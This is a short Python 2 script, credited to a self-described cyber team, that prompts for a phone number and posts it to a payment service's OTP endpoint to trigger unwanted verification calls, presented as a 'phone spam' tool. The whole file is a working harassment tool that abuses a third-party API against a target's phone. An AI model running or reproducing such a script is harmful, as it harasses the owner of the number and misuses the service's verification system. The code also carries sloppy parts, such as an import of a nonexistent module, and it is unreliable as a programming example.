#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Dilarang Recode 
#Mau Recode Izin dulu
#./Spectre_Senpai

import requests
import time,random,sys,os
from requests import *
import echo

def read(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
   
   
os.system("clear")
read("\033[1;32mSpam Telfon By ./Spectre_Senpai\033[0m")
read("\033[1;32mTeam : EZELDRAN CYBER TEAM\033[0m")
read("\033[1;32mFeat : Mr.R41N5\033[0m")
print
notelp = raw_input("Nomor Telp. :\033[1;32m \033[0m")
print "\033[1;94mPlease Wait..."
time.sleep(3)
print
telp = {'msisdn':''+notelp,'accept':'call'}
scrapy = requests.post("https://www.tokocash.com/oauth/otp", data=telp)
for result in scrapy:
    print
    print result
    print result
    print
    print